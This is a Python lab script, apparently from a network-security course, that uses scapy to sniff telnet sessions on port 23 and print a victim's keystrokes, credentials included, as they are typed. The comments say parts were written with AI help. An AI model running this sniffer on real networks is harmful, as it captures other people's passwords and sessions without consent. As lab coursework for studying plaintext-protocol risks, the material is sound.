#!/usr/bin/env python3
# telnet_sniffer.py

    #docksh <attacker-id> 
    #cd /volumes
    #python3 telnet_sniffer.py

#Most comments written with help of GenAI

# Psuedocode (aid from GenAI):
# 1. Setup signal handler to exit cleanly on Ctrl-C.
# 2. Locate the lab network interface: find interface whose IPv4 == 10.9.0.1.
#    If found, sniff on that iface; otherwise sniff on the default (any).
# 3. Use a BPF filter "tcp port 23" so kernel drops unrelated traffic.
# 4. On each sniffed packet (callback):
#    a. Verify packet has IP, TCP and Raw layers; otherwise ignore.
#    b. Only consider client -> server packets where TCP.dport == 23 (keystrokes).
#    c. Identify the flow tuple (client_ip, client_port, server_ip, server_port).
#    d. If no flow tracked yet, accept this as the telnet flow and print a notice.
#    e. If this packet does not belong to the tracked flow, ignore it.
#    f. Use the TCP sequence number to detect retransmits: if tcp.seq == last_seq for this flow, ignore.
#    g. Otherwise set last_seq = tcp.seq and extract printable characters from the Raw payload:
#       - Skip Telnet IAC sequences; if IAC SB (subnegotiation) is seen, skip until IAC SE.
#       - Skip common IAC <cmd> <option> 3-byte sequences (WILL/DO/WONT/DONT).
#       - Skip ANSI/VT100 ESC [ ... sequences (terminal control).
#       - Convert printable ASCII and CR/LF into characters; ignore other bytes.
#    h. If extracted string non-empty, print it immediately (no extra newline) so keystrokes appear as typed.
# 5. Continue sniffing until user interrupts; on exit, terminate cleanly.
#
# Notes:
# - We track a single telnet flow (first seen) to keep output focused and avoid echoes.
# - TCP seq-based deduplication avoids dropping legitimately repeated keystrokes.
# - Subnegotiation skipping prevents terminal-type and speed strings (e.g., "38400...xterm")

from scapy.all import sniff, Raw, TCP, IP, get_if_list, get_if_addr
import time, sys, signal

LAB_ATTACKER_IP = "10.9.0.1"
BPF_FILTER = "tcp port 23"

def stop(signum, frame):
    print("\nStopping sniffer...")
    sys.exit(0)
signal.signal(signal.SIGINT, stop)

def find_lab_iface(attacker_ip=LAB_ATTACKER_IP):
    for iface in get_if_list():
        try:
            if get_if_addr(iface) == attacker_ip:
                return iface
        except Exception:
            pass
    return None

def is_printable_byte(b):
    return (32 <= b <= 126) or b in (10, 13)

def extract_printable_chars(data_bytes): #The code to handle the many edge cases was written with help of GenAI
    """Return string of printable chars while skipping telnet IAC (255) and
       typical ESC [ X sequences (27,91, <letter>). Method written with the help of an LLM
       to ensure desired output without garbage characters."""
    out = []
    i = 0
    L = len(data_bytes)
    while i < L:
        b = data_bytes[i]
        # Telnet IAC (255) handling
        if b == 255:
            # if there's a next byte, inspect command
            if i + 1 < L:
                cmd = data_bytes[i+1]
                # 250 = SB (subnegotiation) -> skip until IAC (255) + SE (240)
                if cmd == 250:
                    j = i + 2
                    while j + 1 < L:
                        if data_bytes[j] == 255 and data_bytes[j+1] == 240:
                            j += 2
                            break
                        j += 1
                    i = j
                    continue
                else:
                    # Common case: IAC <cmd> <option> (3 bytes) e.g., WILL/DO/WONT/DONT
                    if i + 2 < L:
                        i += 3
                    else:
                        # just skip whatever's left of the IAC sequence
                        i += 2
                    continue
            else:
                i += 1
                continue

        # Skip ANSI escape sequences: ESC (27) '[' (91) ... final byte in 64..126
        if b == 27 and i + 1 < L and data_bytes[i+1] == 91:
            j = i + 2
            max_escape_end = min(L, i + 12)
            while j < max_escape_end:
                if 64 <= data_bytes[j] <= 126:
                    j += 1
                    break
                j += 1
            i = j
            continue

        # Printable characters (space..tilde) or CR/LF
        if (32 <= b <= 126) or b in (10, 13):
            if b in (10, 13):
                out.append('\n')
            else:
                out.append(chr(b))
        # otherwise ignore
        i += 1
    return ''.join(out)


# Flow tracking: map flow_key -> dict with last_tcp_seq
flows = {}  # key: (cli_ip, cli_port, srv_ip, srv_port) -> {'last_seq': int}

def handle_pkt(pkt):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return

    ip = pkt[IP]
    tcp = pkt[TCP]
    raw = pkt[Raw].load

    # We're only interested in client -> server keystrokes: dport == 23
    if tcp.dport != 23:
        return

    flow_key = (ip.src, tcp.sport, ip.dst, tcp.dport)

    # track first flow only (assignment environment typically has single active telnet)
    if not flows:
        flows[flow_key] = {'last_seq': None}
        print(f"[+] Tracking telnet flow: client {flow_key[0]}:{flow_key[1]} -> server {flow_key[2]}:{flow_key[3]}")

    if flow_key not in flows:
        return

    entry = flows[flow_key]
    # Use TCP sequence number to detect retransmits/duplicates:
    seq = tcp.seq
    if entry['last_seq'] is not None and seq == entry['last_seq']:
        # duplicate retransmit - ignore
        return
    # update seq for next time
    entry['last_seq'] = seq

    s = extract_printable_chars(raw)
    if not s:
        return

    # Print characters immediately (newline inside s handled)
    print(s, end='', flush=True)

def main():
    iface = find_lab_iface()
    if iface:
        print(f"sniffer: sniffing on '{iface}' (lab IP {LAB_ATTACKER_IP})")
    else:
        print("sniffer: lab interface not found; sniffing on default (any)")

    sniff(iface=iface, filter=BPF_FILTER, prn=handle_pkt, store=False)

if __name__ == "__main__":
    main()